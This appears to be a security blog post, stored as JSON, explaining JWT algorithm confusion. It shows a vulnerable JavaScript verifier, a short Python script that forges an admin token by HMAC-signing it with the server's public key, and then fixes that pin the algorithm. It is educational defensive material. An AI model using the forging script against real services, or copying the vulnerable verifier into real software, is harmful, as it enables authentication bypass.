{"slug":"jwt-algorithm-confusion","title":"JWT Algorithm Confusion: How It Happens and How to Prevent It","date":"2026-10-18","updated":null,"description":"Why trusting the alg header in a JSON Web Token lets attackers forge tokens, a minimal vulnerable verifier, a demonstration, and the fix.","category":"research","platform":null,"difficulty":null,"tags":["web","jwt","authentication"],"featured":false,"cover":null,"readingTime":1,"html":"<p>JSON Web Tokens carry their own description of how they were signed. Algorithm confusion happens when a server believes that description instead of deciding for itself.</p>\n<h2 id=\"anatomy-of-a-token\">Anatomy of a token<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#anatomy-of-a-token\">#</a></h2>\n<figure><img src=\"/images/jwt-algorithm-confusion/jwt-structure.svg\" alt=\"JWT structure: header, payload, signature\" loading=\"lazy\" decoding=\"async\"><figcaption>A JWT is three base64url segments. The header names the algorithm.</figcaption></figure>\n<p>The header contains an <code>alg</code> field such as <code>RS256</code> (RSA signature, verified with a public key) or <code>HS256</code> (HMAC, verified with a shared secret).</p>\n<h2 id=\"the-vulnerable-pattern\">The vulnerable pattern<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#the-vulnerable-pattern\">#</a></h2>\n<p>A server verifies tokens with its RSA public key, but lets the library pick the algorithm from the token:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">javascript</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"javascript\"><code><span class=\"line\"><span style=\"--shiki-light:#6A737D;--shiki-dark:#768390\">// VULNERABLE: the algorithm comes from the attacker-controlled header</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">const</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> claims</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> =</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> jwt.</span><span style=\"--shiki-light:#6F42C1;--shiki-dark:#DCBDFB\">verify</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">(token, publicKey);</span></span></code></pre></div>\n<p>If the library accepts both RSA and HMAC algorithms for a given key, an attacker can:</p>\n<ol>\n<li>Obtain the server's public key (it is public, often served at <code>/.well-known/jwks.json</code>).</li>\n<li>Change the header to <code>{\"alg\":\"HS256\"}</code>.</li>\n<li>Sign the token with HMAC, using the public key bytes as the secret.</li>\n<li>The server \"verifies\" the HMAC with the same key bytes and accepts it.</li>\n</ol>\n<h2 id=\"demonstration-in-a-lab\">Demonstration in a lab<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#demonstration-in-a-lab\">#</a></h2>\n<p>On a deliberately vulnerable application you control:</p>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">python</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"python\"><code><span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">import</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> hmac, hashlib, base64, json</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">def</span><span style=\"--shiki-light:#6F42C1;--shiki-dark:#DCBDFB\"> b64</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">(data: </span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">bytes</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">) -> </span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">bytes</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">:</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">    return</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> base64.urlsafe_b64encode(data).rstrip(</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">b</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"=\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">header </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> b64(json.dumps({</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"alg\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">: </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"HS256\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">, </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"typ\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">: </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"JWT\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">}).encode())</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">payload </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> b64(json.dumps({</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"sub\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">: </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"admin\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">}).encode())</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">signing_input </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> header </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">+</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> b</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\".\"</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> +</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> payload</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">public_key </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> open</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">(</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"public.pem\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">, </span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"rb\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">).read()</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">sig </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">=</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> b64(hmac.new(public_key, signing_input, hashlib.sha256).digest())</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\">print</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">((signing_input </span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">+</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> b</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\".\"</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> +</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> sig).decode())</span></span></code></pre></div>\n<aside class=\"callout callout-warning\" role=\"note\"><p class=\"callout-title\">Warning</p>\n<p>Only test systems you own or are explicitly authorised to assess.</p>\n</aside>\n<h2 id=\"prevention\">Prevention<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#prevention\">#</a></h2>\n<div class=\"code-block\"><div class=\"code-header\"><span class=\"code-lang\">javascript</span><button type=\"button\" class=\"copy-btn\" aria-label=\"Copy code to clipboard\" data-copy=\"\">Copy</button></div><pre class=\"shiki shiki-themes github-light github-dark-dimmed\" style=\"--shiki-light:#24292e;--shiki-dark:#adbac7;--shiki-light-bg:#fff;--shiki-dark-bg:#22272e\" tabindex=\"0\" data-language=\"javascript\"><code><span class=\"line\"><span style=\"--shiki-light:#6A737D;--shiki-dark:#768390\">// Pin the algorithm on the server.</span></span>\n<span class=\"line\"><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\">const</span><span style=\"--shiki-light:#005CC5;--shiki-dark:#6CB6FF\"> claims</span><span style=\"--shiki-light:#D73A49;--shiki-dark:#F47067\"> =</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\"> jwt.</span><span style=\"--shiki-light:#6F42C1;--shiki-dark:#DCBDFB\">verify</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">(token, publicKey, { algorithms: [</span><span style=\"--shiki-light:#032F62;--shiki-dark:#96D0FF\">\"RS256\"</span><span style=\"--shiki-light:#24292E;--shiki-dark:#ADBAC7\">] });</span></span></code></pre></div>\n<ul>\n<li>Pin accepted algorithms in code or configuration.</li>\n<li>Never use one key object for both asymmetric and symmetric verification.</li>\n<li>Reject <code>alg: none</code> unconditionally.</li>\n<li>Validate <code>iss</code>, <code>aud</code> and <code>exp</code> claims after the signature check.</li>\n</ul>\n<h2 id=\"references\">References<a class=\"heading-anchor\" aria-label=\"Link to this section\" href=\"#references\">#</a></h2>\n<ul>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7519\">RFC 7519: JSON Web Token</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8725\">RFC 8725: JWT Best Current Practices</a></li>\n</ul>","toc":[{"depth":2,"id":"anatomy-of-a-token","text":"Anatomy of a token"},{"depth":2,"id":"the-vulnerable-pattern","text":"The vulnerable pattern"},{"depth":2,"id":"demonstration-in-a-lab","text":"Demonstration in a lab"},{"depth":2,"id":"prevention","text":"Prevention"},{"depth":2,"id":"references","text":"References"}],"prev":{"slug":"htb-sample-lantern","title":"Sample HTB Writeup: Lantern (Fictional Linux Box)"},"next":{"slug":"how-this-blog-works","title":"How This Blog Works (and a Markdown Feature Tour)"},"related":["htb-sample-lantern","thm-sample-sql-injection-room"]}